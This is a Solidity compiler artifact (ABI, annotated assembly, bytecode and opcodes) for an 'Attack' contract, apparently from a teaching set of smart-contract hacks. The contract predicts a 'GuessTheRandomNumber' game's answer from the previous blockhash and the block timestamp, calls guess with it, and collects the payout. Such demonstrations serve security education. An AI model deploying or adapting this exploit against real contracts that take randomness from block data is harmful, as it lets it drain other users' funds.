{
	"Hacks/Randomness.sol": {
		"Attack": {
			"abi": [
				{
					"inputs": [
						{
							"internalType": "contract GuessTheRandomNumber",
							"name": "guessTheRandomNumber",
							"type": "address"
						}
					],
					"name": "attack",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "getBalance",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"stateMutability": "payable",
					"type": "receive"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"Hacks/Randomness.sol\":1246:1742  contract Attack {... */\n  mstore(0x40, 0x80)\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  revert(0x00, 0x00)\ntag_1:\n  pop\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"Hacks/Randomness.sol\":1246:1742  contract Attack {... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x12065fe0\n      eq\n      tag_3\n      jumpi\n      dup1\n      0xd018db3e\n      eq\n      tag_4\n      jumpi\n      jump(tag_2)\n    tag_1:\n      jumpi(tag_2, calldatasize)\n      stop\n    tag_2:\n      revert(0x00, 0x00)\n        /* \"Hacks/Randomness.sol\":1640:1739  function getBalance() public view returns (uint256) {... */\n    tag_3:\n      callvalue\n      dup1\n      iszero\n      tag_7\n      jumpi\n      revert(0x00, 0x00)\n    tag_7:\n      pop\n      tag_8\n      tag_9\n      jump\t// in\n    tag_8:\n      mload(0x40)\n      tag_10\n      swap2\n      swap1\n      tag_11\n      jump\t// in\n    tag_10:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"Hacks/Randomness.sol\":1306:1591  function attack(GuessTheRandomNumber guessTheRandomNumber) public {... */\n    tag_4:\n      callvalue\n      dup1\n      iszero\n      tag_12\n      jumpi\n      revert(0x00, 0x00)\n    tag_12:\n      pop\n      tag_13\n      0x04\n      dup1\n      calldatasize\n      sub\n      dup2\n      add\n      swap1\n      tag_14\n      swap2\n      swap1\n      tag_15\n      jump\t// in\n    tag_14:\n      tag_16\n      jump\t// in\n    tag_13:\n      stop\n        /* \"Hacks/Randomness.sol\":1640:1739  function getBalance() public view returns (uint256) {... */\n    tag_9:\n        /* \"Hacks/Randomness.sol\":1683:1690  uint256 */\n      0x00\n        /* \"Hacks/Randomness.sol\":1710:1731  address(this).balance */\n      selfbalance\n        /* \"Hacks/Randomness.sol\":1703:1731  return address(this).balance */\n      swap1\n      pop\n        /* \"Hacks/Randomness.sol\":1640:1739  function getBalance() public view returns (uint256) {... */\n      swap1\n      jump\t// out\n        /* \"Hacks/Randomness.sol\":1306:1591  function attack(GuessTheRandomNumber guessTheRandomNumber) public {... */\n    tag_16:\n        /* \"Hacks/Randomness.sol\":1383:1397  uint256 answer */\n      0x00\n        /* \"Hacks/Randomness.sol\":1492:1493  1 */\n      0x01\n        /* \"Hacks/Randomness.sol\":1477:1489  block.number */\n      number\n        /* \"Hacks/Randomness.sol\":1477:1493  block.number - 1 */\n      tag_19\n      swap2\n      swap1\n      tag_20\n      jump\t// in\n    tag_19:\n        /* \"Hacks/Randomness.sol\":1467:1494  blockhash(block.number - 1) */\n      blockhash\n        /* \"Hacks/Randomness.sol\":1496:1511  block.timestamp */\n      timestamp\n        /* \"Hacks/Randomness.sol\":1450:1512  abi.encodePacked(blockhash(block.number - 1), block.timestamp) */\n      add(0x20, mload(0x40))\n      tag_21\n      swap3\n      swap2\n      swap1\n      tag_22\n      jump\t// in\n    tag_21:\n      mload(0x40)\n      0x20\n      dup2\n      dup4\n      sub\n      sub\n      dup2\n      mstore\n      swap1\n      0x40\n      mstore\n        /* \"Hacks/Randomness.sol\":1422:1527  keccak256(... */\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      keccak256\n        /* \"Hacks/Randomness.sol\":1400:1538  uint256(... */\n      0x00\n      shr\n        /* \"Hacks/Randomness.sol\":1383:1538  uint256 answer = uint256(... */\n      swap1\n      pop\n        /* \"Hacks/Randomness.sol\":1549:1569  guessTheRandomNumber */\n      dup2\n        /* \"Hacks/Randomness.sol\":1549:1575  guessTheRandomNumber.guess */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x9189fec1\n        /* \"Hacks/Randomness.sol\":1576:1582  answer */\n      dup3\n        /* \"Hacks/Randomness.sol\":1549:1583  guessTheRandomNumber.guess(answer) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_23\n      swap2\n      swap1\n      tag_11\n      jump\t// in\n    tag_23:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_24\n      jumpi\n      revert(0x00, 0x00)\n    tag_24:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_26\n      jumpi\n      returndatacopy(0x00, 0x00, returndatasize)\n      revert(0x00, returndatasize)\n    tag_26:\n      pop\n      pop\n      pop\n      pop\n        /* \"Hacks/Randomness.sol\":1372:1591  {... */\n      pop\n        /* \"Hacks/Randomness.sol\":1306:1591  function attack(GuessTheRandomNumber guessTheRandomNumber) public {... */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":7:84   */\n    tag_27:\n        /* \"#utility.yul\":44:51   */\n      0x00\n        /* \"#utility.yul\":73:78   */\n      dup2\n        /* \"#utility.yul\":62:78   */\n      swap1\n      pop\n        /* \"#utility.yul\":7:84   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":90:208   */\n    tag_28:\n        /* \"#utility.yul\":177:201   */\n      tag_46\n        /* \"#utility.yul\":195:200   */\n      dup2\n        /* \"#utility.yul\":177:201   */\n      tag_27\n      jump\t// in\n    tag_46:\n        /* \"#utility.yul\":172:175   */\n      dup3\n        /* \"#utility.yul\":165:202   */\n      mstore\n        /* \"#utility.yul\":90:208   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":214:436   */\n    tag_11:\n        /* \"#utility.yul\":307:311   */\n      0x00\n        /* \"#utility.yul\":345:347   */\n      0x20\n        /* \"#utility.yul\":334:343   */\n      dup3\n        /* \"#utility.yul\":330:348   */\n      add\n        /* \"#utility.yul\":322:348   */\n      swap1\n      pop\n        /* \"#utility.yul\":358:429   */\n      tag_48\n        /* \"#utility.yul\":426:427   */\n      0x00\n        /* \"#utility.yul\":415:424   */\n      dup4\n        /* \"#utility.yul\":411:428   */\n      add\n        /* \"#utility.yul\":402:408   */\n      dup5\n        /* \"#utility.yul\":358:429   */\n      tag_28\n      jump\t// in\n    tag_48:\n        /* \"#utility.yul\":214:436   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":523:640   */\n    tag_30:\n        /* \"#utility.yul\":632:633   */\n      0x00\n        /* \"#utility.yul\":629:630   */\n      0x00\n        /* \"#utility.yul\":622:634   */\n      revert\n        /* \"#utility.yul\":769:895   */\n    tag_32:\n        /* \"#utility.yul\":806:813   */\n      0x00\n        /* \"#utility.yul\":846:888   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":839:844   */\n      dup3\n        /* \"#utility.yul\":835:889   */\n      and\n        /* \"#utility.yul\":824:889   */\n      swap1\n      pop\n        /* \"#utility.yul\":769:895   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":901:997   */\n    tag_33:\n        /* \"#utility.yul\":938:945   */\n      0x00\n        /* \"#utility.yul\":967:991   */\n      tag_54\n        /* \"#utility.yul\":985:990   */\n      dup3\n        /* \"#utility.yul\":967:991   */\n      tag_32\n      jump\t// in\n    tag_54:\n        /* \"#utility.yul\":956:991   */\n      swap1\n      pop\n        /* \"#utility.yul\":901:997   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1003:1126   */\n    tag_34:\n        /* \"#utility.yul\":1067:1074   */\n      0x00\n        /* \"#utility.yul\":1096:1120   */\n      tag_56\n        /* \"#utility.yul\":1114:1119   */\n      dup3\n        /* \"#utility.yul\":1096:1120   */\n      tag_33\n      jump\t// in\n    tag_56:\n        /* \"#utility.yul\":1085:1120   */\n      swap1\n      pop\n        /* \"#utility.yul\":1003:1126   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1132:1308   */\n    tag_35:\n        /* \"#utility.yul\":1232:1283   */\n      tag_58\n        /* \"#utility.yul\":1277:1282   */\n      dup2\n        /* \"#utility.yul\":1232:1283   */\n      tag_34\n      jump\t// in\n    tag_58:\n        /* \"#utility.yul\":1225:1230   */\n      dup2\n        /* \"#utility.yul\":1222:1284   */\n      eq\n        /* \"#utility.yul\":1212:1302   */\n      tag_59\n      jumpi\n        /* \"#utility.yul\":1298:1299   */\n      0x00\n        /* \"#utility.yul\":1295:1296   */\n      0x00\n        /* \"#utility.yul\":1288:1300   */\n      revert\n        /* \"#utility.yul\":1212:1302   */\n    tag_59:\n        /* \"#utility.yul\":1132:1308   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1314:1507   */\n    tag_36:\n        /* \"#utility.yul\":1387:1392   */\n      0x00\n        /* \"#utility.yul\":1425:1431   */\n      dup2\n        /* \"#utility.yul\":1412:1432   */\n      calldataload\n        /* \"#utility.yul\":1403:1432   */\n      swap1\n      pop\n        /* \"#utility.yul\":1441:1501   */\n      tag_61\n        /* \"#utility.yul\":1495:1500   */\n      dup2\n        /* \"#utility.yul\":1441:1501   */\n      tag_35\n      jump\t// in\n    tag_61:\n        /* \"#utility.yul\":1314:1507   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1513:1896   */\n    tag_15:\n        /* \"#utility.yul\":1599:1605   */\n      0x00\n        /* \"#utility.yul\":1648:1650   */\n      0x20\n        /* \"#utility.yul\":1636:1645   */\n      dup3\n        /* \"#utility.yul\":1627:1634   */\n      dup5\n        /* \"#utility.yul\":1623:1646   */\n      sub\n        /* \"#utility.yul\":1619:1651   */\n      slt\n        /* \"#utility.yul\":1616:1735   */\n      iszero\n      tag_63\n      jumpi\n        /* \"#utility.yul\":1654:1733   */\n      tag_64\n      tag_30\n      jump\t// in\n    tag_64:\n        /* \"#utility.yul\":1616:1735   */\n    tag_63:\n        /* \"#utility.yul\":1774:1775   */\n      0x00\n        /* \"#utility.yul\":1799:1879   */\n      tag_65\n        /* \"#utility.yul\":1871:1878   */\n      dup5\n        /* \"#utility.yul\":1862:1868   */\n      dup3\n        /* \"#utility.yul\":1851:1860   */\n      dup6\n        /* \"#utility.yul\":1847:1869   */\n      add\n        /* \"#utility.yul\":1799:1879   */\n      tag_36\n      jump\t// in\n    tag_65:\n        /* \"#utility.yul\":1789:1879   */\n      swap2\n      pop\n        /* \"#utility.yul\":1745:1889   */\n      pop\n        /* \"#utility.yul\":1513:1896   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1902:2082   */\n    tag_37:\n        /* \"#utility.yul\":1950:2027   */\n      0x4e487b7100000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":1947:1948   */\n      0x00\n        /* \"#utility.yul\":1940:2028   */\n      mstore\n        /* \"#utility.yul\":2047:2051   */\n      0x11\n        /* \"#utility.yul\":2044:2045   */\n      0x04\n        /* \"#utility.yul\":2037:2052   */\n      mstore\n        /* \"#utility.yul\":2071:2075   */\n      0x24\n        /* \"#utility.yul\":2068:2069   */\n      0x00\n        /* \"#utility.yul\":2061:2076   */\n      revert\n        /* \"#utility.yul\":2088:2282   */\n    tag_20:\n        /* \"#utility.yul\":2128:2132   */\n      0x00\n        /* \"#utility.yul\":2148:2168   */\n      tag_68\n        /* \"#utility.yul\":2166:2167   */\n      dup3\n        /* \"#utility.yul\":2148:2168   */\n      tag_27\n      jump\t// in\n    tag_68:\n        /* \"#utility.yul\":2143:2168   */\n      swap2\n      pop\n        /* \"#utility.yul\":2182:2202   */\n      tag_69\n        /* \"#utility.yul\":2200:2201   */\n      dup4\n        /* \"#utility.yul\":2182:2202   */\n      tag_27\n      jump\t// in\n    tag_69:\n        /* \"#utility.yul\":2177:2202   */\n      swap3\n      pop\n        /* \"#utility.yul\":2226:2227   */\n      dup3\n        /* \"#utility.yul\":2223:2224   */\n      dup3\n        /* \"#utility.yul\":2219:2228   */\n      sub\n        /* \"#utility.yul\":2211:2228   */\n      swap1\n      pop\n        /* \"#utility.yul\":2250:2251   */\n      dup2\n        /* \"#utility.yul\":2244:2248   */\n      dup2\n        /* \"#utility.yul\":2241:2252   */\n      gt\n        /* \"#utility.yul\":2238:2275   */\n      iszero\n      tag_70\n      jumpi\n        /* \"#utility.yul\":2255:2273   */\n      tag_71\n      tag_37\n      jump\t// in\n    tag_71:\n        /* \"#utility.yul\":2238:2275   */\n    tag_70:\n        /* \"#utility.yul\":2088:2282   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2288:2365   */\n    tag_38:\n        /* \"#utility.yul\":2325:2332   */\n      0x00\n        /* \"#utility.yul\":2354:2359   */\n      dup2\n        /* \"#utility.yul\":2343:2359   */\n      swap1\n      pop\n        /* \"#utility.yul\":2288:2365   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2371:2450   */\n    tag_39:\n        /* \"#utility.yul\":2410:2417   */\n      0x00\n        /* \"#utility.yul\":2439:2444   */\n      dup2\n        /* \"#utility.yul\":2428:2444   */\n      swap1\n      pop\n        /* \"#utility.yul\":2371:2450   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2456:2613   */\n    tag_40:\n        /* \"#utility.yul\":2561:2606   */\n      tag_75\n        /* \"#utility.yul\":2581:2605   */\n      tag_76\n        /* \"#utility.yul\":2599:2604   */\n      dup3\n        /* \"#utility.yul\":2581:2605   */\n      tag_38\n      jump\t// in\n    tag_76:\n        /* \"#utility.yul\":2561:2606   */\n      tag_39\n      jump\t// in\n    tag_75:\n        /* \"#utility.yul\":2556:2559   */\n      dup3\n        /* \"#utility.yul\":2549:2607   */\n      mstore\n        /* \"#utility.yul\":2456:2613   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2619:2698   */\n    tag_41:\n        /* \"#utility.yul\":2658:2665   */\n      0x00\n        /* \"#utility.yul\":2687:2692   */\n      dup2\n        /* \"#utility.yul\":2676:2692   */\n      swap1\n      pop\n        /* \"#utility.yul\":2619:2698   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2704:2861   */\n    tag_42:\n        /* \"#utility.yul\":2809:2854   */\n      tag_79\n        /* \"#utility.yul\":2829:2853   */\n      tag_80\n        /* \"#utility.yul\":2847:2852   */\n      dup3\n        /* \"#utility.yul\":2829:2853   */\n      tag_27\n      jump\t// in\n    tag_80:\n        /* \"#utility.yul\":2809:2854   */\n      tag_41\n      jump\t// in\n    tag_79:\n        /* \"#utility.yul\":2804:2807   */\n      dup3\n        /* \"#utility.yul\":2797:2855   */\n      mstore\n        /* \"#utility.yul\":2704:2861   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2867:3264   */\n    tag_22:\n        /* \"#utility.yul\":3007:3010   */\n      0x00\n        /* \"#utility.yul\":3022:3097   */\n      tag_82\n        /* \"#utility.yul\":3093:3096   */\n      dup3\n        /* \"#utility.yul\":3084:3090   */\n      dup6\n        /* \"#utility.yul\":3022:3097   */\n      tag_40\n      jump\t// in\n    tag_82:\n        /* \"#utility.yul\":3122:3124   */\n      0x20\n        /* \"#utility.yul\":3117:3120   */\n      dup3\n        /* \"#utility.yul\":3113:3125   */\n      add\n        /* \"#utility.yul\":3106:3125   */\n      swap2\n      pop\n        /* \"#utility.yul\":3135:3210   */\n      tag_83\n        /* \"#utility.yul\":3206:3209   */\n      dup3\n        /* \"#utility.yul\":3197:3203   */\n      dup5\n        /* \"#utility.yul\":3135:3210   */\n      tag_42\n      jump\t// in\n    tag_83:\n        /* \"#utility.yul\":3235:3237   */\n      0x20\n        /* \"#utility.yul\":3230:3233   */\n      dup3\n        /* \"#utility.yul\":3226:3238   */\n      add\n        /* \"#utility.yul\":3219:3238   */\n      swap2\n      pop\n        /* \"#utility.yul\":3255:3258   */\n      dup2\n        /* \"#utility.yul\":3248:3258   */\n      swap1\n      pop\n        /* \"#utility.yul\":2867:3264   */\n      swap4\n      swap3\n      pop\n      pop\n      pop\n      jump\t// out\n\n    auxdata: 0xa26469706673582212203fef21d540012c2551a6eac352b5f1f9ccad436df2a9de3086e33a7f05490ac764736f6c634300081c0033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "6080604052348015600e575f5ffd5b5061030a8061001c5f395ff3fe60806040526004361061002c575f3560e01c806312065fe014610037578063d018db3e1461006157610033565b3661003357005b5f5ffd5b348015610042575f5ffd5b5061004b610089565b604051610058919061014d565b60405180910390f35b34801561006c575f5ffd5b50610087600480360381019061008291906101d5565b610090565b005b5f47905090565b5f60014361009e919061022d565b40426040516020016100b19291906102a9565b604051602081830303815290604052805190602001205f1c90508173ffffffffffffffffffffffffffffffffffffffff16639189fec1826040518263ffffffff1660e01b8152600401610104919061014d565b5f604051808303815f87803b15801561011b575f5ffd5b505af115801561012d573d5f5f3e3d5ffd5b505050505050565b5f819050919050565b61014781610135565b82525050565b5f6020820190506101605f83018461013e565b92915050565b5f5ffd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6101938261016a565b9050919050565b5f6101a482610189565b9050919050565b6101b48161019a565b81146101be575f5ffd5b50565b5f813590506101cf816101ab565b92915050565b5f602082840312156101ea576101e9610166565b5b5f6101f7848285016101c1565b91505092915050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601160045260245ffd5b5f61023782610135565b915061024283610135565b925082820390508181111561025a57610259610200565b5b92915050565b5f819050919050565b5f819050919050565b61028361027e82610260565b610269565b82525050565b5f819050919050565b6102a361029e82610135565b610289565b82525050565b5f6102b48285610272565b6020820191506102c48284610292565b602082019150819050939250505056fea26469706673582212203fef21d540012c2551a6eac352b5f1f9ccad436df2a9de3086e33a7f05490ac764736f6c634300081c0033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH1 0xE JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH2 0x30A DUP1 PUSH2 0x1C PUSH0 CODECOPY PUSH0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x2C JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x12065FE0 EQ PUSH2 0x37 JUMPI DUP1 PUSH4 0xD018DB3E EQ PUSH2 0x61 JUMPI PUSH2 0x33 JUMP JUMPDEST CALLDATASIZE PUSH2 0x33 JUMPI STOP JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x42 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH2 0x4B PUSH2 0x89 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x58 SWAP2 SWAP1 PUSH2 0x14D JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x6C JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH2 0x87 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x82 SWAP2 SWAP1 PUSH2 0x1D5 JUMP JUMPDEST PUSH2 0x90 JUMP JUMPDEST STOP JUMPDEST PUSH0 SELFBALANCE SWAP1 POP SWAP1 JUMP JUMPDEST PUSH0 PUSH1 0x1 NUMBER PUSH2 0x9E SWAP2 SWAP1 PUSH2 0x22D JUMP JUMPDEST BLOCKHASH TIMESTAMP PUSH1 0x40 MLOAD PUSH1 0x20 ADD PUSH2 0xB1 SWAP3 SWAP2 SWAP1 PUSH2 0x2A9 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE DUP1 MLOAD SWAP1 PUSH1 0x20 ADD KECCAK256 PUSH0 SHR SWAP1 POP DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x9189FEC1 DUP3 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x104 SWAP2 SWAP1 PUSH2 0x14D JUMP JUMPDEST PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x11B JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x12D JUMPI RETURNDATASIZE PUSH0 PUSH0 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP POP POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x147 DUP2 PUSH2 0x135 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x160 PUSH0 DUP4 ADD DUP5 PUSH2 0x13E JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x193 DUP3 PUSH2 0x16A JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x1A4 DUP3 PUSH2 0x189 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x1B4 DUP2 PUSH2 0x19A JUMP JUMPDEST DUP2 EQ PUSH2 0x1BE JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x1CF DUP2 PUSH2 0x1AB JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x1EA JUMPI PUSH2 0x1E9 PUSH2 0x166 JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x1F7 DUP5 DUP3 DUP6 ADD PUSH2 0x1C1 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST PUSH0 PUSH2 0x237 DUP3 PUSH2 0x135 JUMP JUMPDEST SWAP2 POP PUSH2 0x242 DUP4 PUSH2 0x135 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 SUB SWAP1 POP DUP2 DUP2 GT ISZERO PUSH2 0x25A JUMPI PUSH2 0x259 PUSH2 0x200 JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x283 PUSH2 0x27E DUP3 PUSH2 0x260 JUMP JUMPDEST PUSH2 0x269 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x2A3 PUSH2 0x29E DUP3 PUSH2 0x135 JUMP JUMPDEST PUSH2 0x289 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH2 0x2B4 DUP3 DUP6 PUSH2 0x272 JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP2 POP PUSH2 0x2C4 DUP3 DUP5 PUSH2 0x292 JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP2 POP DUP2 SWAP1 POP SWAP4 SWAP3 POP POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 EXTCODEHASH 0xEF 0x21 0xD5 BLOCKHASH ADD 0x2C 0x25 MLOAD 0xA6 0xEA 0xC3 MSTORE 0xB5 CALL 0xF9 0xCC 0xAD NUMBER PUSH14 0xF2A9DE3086E33A7F05490AC76473 PUSH16 0x6C634300081C00330000000000000000 "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "155600",
						"executionCost": "200",
						"totalCost": "155800"
					},
					"external": {
						"attack(address)": "infinite",
						"getBalance()": "312"
					}
				},
				"methodIdentifiers": {
					"attack(address)": "d018db3e",
					"getBalance()": "12065fe0"
				}
			},
			"storageLayout": {
				"storage": [],
				"types": null
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}